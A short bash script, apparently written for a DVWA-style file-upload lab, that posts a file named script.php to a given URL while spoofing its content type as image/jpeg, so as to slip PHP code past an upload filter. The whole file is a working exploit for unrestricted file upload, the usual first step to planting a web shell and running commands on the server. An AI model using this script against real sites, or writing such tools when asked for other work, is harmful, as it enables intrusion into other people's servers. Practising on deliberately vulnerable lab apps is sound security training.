#!/bin/bash

if [ -z "$1" ]
    then
        echo "No url provided"
        exit 1
fi

curl -X POST -F "MAX_FILE_SIZE=100000" -F "uploaded=@script.php;type=image/jpeg" -F "Upload=Upload" "$1"